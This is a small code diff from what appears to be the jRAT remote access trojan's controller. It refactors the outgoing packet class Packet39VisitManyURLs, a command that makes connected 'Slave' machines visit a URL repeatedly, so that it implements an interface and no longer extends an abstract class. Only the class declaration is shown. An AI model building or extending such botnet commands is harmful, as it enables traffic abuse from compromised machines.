@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet39VisitManyURLs extends AbstractOutgoingPacket {
+public class Packet39VisitManyURLs implements OutgoingPacket {
 
 	private String url;
 	private int times;
